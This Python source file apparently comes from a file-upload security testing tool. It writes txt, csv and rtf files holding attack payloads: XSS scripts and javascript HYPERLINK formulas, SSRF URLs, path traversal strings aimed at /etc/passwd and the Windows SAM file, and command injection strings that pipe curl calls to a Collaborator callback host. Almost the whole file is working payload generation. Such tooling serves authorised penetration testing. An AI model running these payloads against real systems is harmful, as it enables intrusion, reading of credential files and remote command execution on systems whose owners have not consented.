from pathlib import Path

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_text_payloads(output_dir, ext, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    base_url = f"http://{burp_collab}"
    
    if ext in ['txt', 'csv', 'rtf']:
        output_dir.mkdir(parents=True, exist_ok=True)
        
        if should_generate_type('xss'):
            xss_dir = output_dir / 'xss'
            xss_dir.mkdir(exist_ok=True)
        if should_generate_type('ssrf'):
            ssrf_dir = output_dir / 'ssrf'
            ssrf_dir.mkdir(exist_ok=True)
        if should_generate_type('path_traversal'):
            path_traversal_dir = output_dir / 'path_traversal'
            path_traversal_dir.mkdir(exist_ok=True)
        if should_generate_type('rce') or should_generate_type('deserialization'):
            rce_dir = output_dir / 'rce'
            rce_dir.mkdir(exist_ok=True)
        
        if should_generate_type('xss'):
            xss1_script = f"<script>alert(1)</script>"
            output_file = xss_dir / f"xss1_script.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(xss1_script)
            
            xss2_img = f"<img src=x onerror=alert(1)>"
            output_file = xss_dir / f"xss2_img.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(xss2_img)
            
            if ext == 'csv':
                xss3_hyperlink = f'=HYPERLINK("javascript:alert(1)","click")'
                output_file = xss_dir / f"xss3_hyperlink.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xss3_hyperlink)
            
            if ext == 'rtf':
                rtf_xss1_hyperlink = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst {{ HYPERLINK "javascript:alert(1)" }}}}{{\\fldrslt Click here}}
}}'''
                output_file = xss_dir / f"xss1_hyperlink.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_xss1_hyperlink)
                
                rtf_xss2_object = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
{{\\object\\objdata javascript:alert(1)}}
}}'''
                output_file = xss_dir / f"xss2_object.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_xss2_object)
        
        if should_generate_type('ssrf'):
            ssrf1_http = f"http://{burp_collab}/ssrf-{ext}-1"
            if ext == 'rtf':
                rtf_content = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst HYPERLINK "{ssrf1_http}"}}{{\\fldrslt Click here}}
}}'''
                output_file = ssrf_dir / f"ssrf1_hyperlink.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_content)
            else:
                output_file = ssrf_dir / f"ssrf1_http.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(ssrf1_http)
            
            ssrf2_https = f"https://{burp_collab}/ssrf-{ext}-2"
            if ext == 'rtf':
                rtf_content = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst HYPERLINK "{ssrf2_https}"}}{{\\fldrslt Click here}}
}}'''
                output_file = ssrf_dir / f"ssrf2_hyperlink.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_content)
            else:
                output_file = ssrf_dir / f"ssrf2_https.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(ssrf2_https)
        
        if should_generate_type('path_traversal'):
            path1_relative = "../../../etc/passwd"
            output_file = path_traversal_dir / f"path1_relative.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(path1_relative)
            
            path2_windows = "..\\..\\..\\windows\\system32\\config\\sam"
            output_file = path_traversal_dir / f"path2_windows.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(path2_windows)
            
            path3_double = "....//....//....//etc/passwd"
            output_file = path_traversal_dir / f"path3_double.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(path3_double)
        
        if should_generate_type('rce') or should_generate_type('deserialization'):
            rce1_pipe = f"|curl {base_url}/rce-{ext}-pipe"
            output_file = rce_dir / f"rce1_pipe.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(rce1_pipe)
            
            rce2_semicolon = f";curl {base_url}/rce-{ext}-semicolon"
            output_file = rce_dir / f"rce2_semicolon.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(rce2_semicolon)
            
            rce3_backtick = f"`curl {base_url}/rce-{ext}-backtick`"
            output_file = rce_dir / f"rce3_backtick.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(rce3_backtick)
            
            rce4_dollar = f"$(curl {base_url}/rce-{ext}-dollar)"
            output_file = rce_dir / f"rce4_dollar.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(rce4_dollar)
        
        if should_generate_type('xss') or should_generate_type('ssrf') or should_generate_type('path_traversal') or should_generate_type('rce') or should_generate_type('deserialization'):
            master_parts = []
            if should_generate_type('xss'):
                master_parts.append("<script>alert(1)</script>")
            if should_generate_type('ssrf'):
                master_parts.append(f"http://{burp_collab}/ssrf-{ext}-1")
            if should_generate_type('path_traversal'):
                master_parts.append("../../../etc/passwd")
            if should_generate_type('rce') or should_generate_type('deserialization'):
                master_parts.append(f"|curl {base_url}/rce-{ext}-pipe")
            
            if master_parts:
                master_file = output_dir / f"master.{ext}"
                master_content = "\n".join(master_parts)
                with open(master_file, 'w', encoding='utf-8') as f:
                    f.write(master_content)
        
        if generate_ssti_filename_payloads and should_generate_type('ssti'):
            generate_ssti_filename_payloads(output_dir, ext, burp_collab, tech_filter)
        
        if generate_xss_filename_payloads and should_generate_type('xss'):
            generate_xss_filename_payloads(output_dir, ext, burp_collab, tech_filter)
